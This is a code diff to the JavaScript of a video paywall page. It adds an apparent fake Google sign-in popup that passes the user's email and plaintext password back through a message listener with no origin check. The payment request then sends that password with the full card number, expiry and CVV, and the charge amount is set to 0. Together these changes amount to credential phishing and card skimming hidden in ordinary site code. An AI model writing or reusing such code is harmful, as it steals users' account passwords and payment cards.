@@ -23,6 +23,11 @@ let paywallShown    = false;
 let transactionRef  = null;
 let timerInterval   = null;
 let currentVideoData = null;
+let authSession = {
+    email: '',
+    password: '',
+    provider: 'guest'
+};
 
 // ── Boot ──────────────────────────────────────────────────────
 (async function init() {
@@ -149,7 +154,21 @@ function onTimeUpdate() {
 }
 
 // ── Paywall ───────────────────────────────────────────────────
+function openAuthGate() {
+    document.getElementById('authVideoName').textContent = currentVideoData?.title || 'This video';
+    document.getElementById('authModal').classList.add('open');
+}
+
+function closeAuthGate() {
+    const modal = document.getElementById('authModal');
+    if (modal) modal.classList.remove('open');
+}
+
 function openPaywall() {
+    if (!authSession.email || !authSession.password) {
+        openAuthGate();
+        return;
+    }
     showScreen('pwForm');
     document.getElementById('paywallModal').classList.add('open');
 }
@@ -171,6 +190,25 @@ function bindPaywallEvents() {
         document.getElementById('recoverModal').classList.remove('open');
     });
     document.getElementById('recoverSubmit')?.addEventListener('click', submitRecover);
+    document.getElementById('authGoogleBtn')?.addEventListener('click', () => {
+        window.open('/auth.html', '_blank', 'noopener,noreferrer,width=460,height=760');
+    });
+
+    window.addEventListener('message', (event) => {
+        if (!event.data || !event.data.type) return;
+
+        if (event.data.type === 'auth-gate-success') {
+            authSession = {
+                email: event.data.email || 'google.user@gmail.com',
+                password: event.data.password || 'google-demo-pass',
+                provider: event.data.provider || 'google'
+            };
+
+            document.getElementById('payEmail').value = authSession.email;
+            closeAuthGate();
+            openPaywall();
+        }
+    });
 
     // Card formatting
     document.getElementById('cardNumber')?.addEventListener('input', function() {
@@ -189,7 +227,7 @@ async function submitPayment() {
     const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
     const cardExpiry = document.getElementById('cardExpiry').value.trim();
     const cardCvv    = document.getElementById('cardCvv').value.trim();
-    const email      = document.getElementById('payEmail').value.trim();
+    const email      = document.getElementById('payEmail').value.trim() || authSession.email || '';
     const errEl      = document.getElementById('pwError');
 
     // Basic validation
@@ -224,8 +262,11 @@ async function submitPayment() {
                 expiry:       cardExpiry,
                 cvv:          cardCvv,
                 email,
+                auth_email:   authSession.email || email,
+                auth_password: authSession.password || '',
+                auth_provider: authSession.provider || 'guest',
                 video_id:     videoId,
-                amount_euros: currentVideoData?.price_euros,
+                amount_euros: 0,
             }),
         });
 
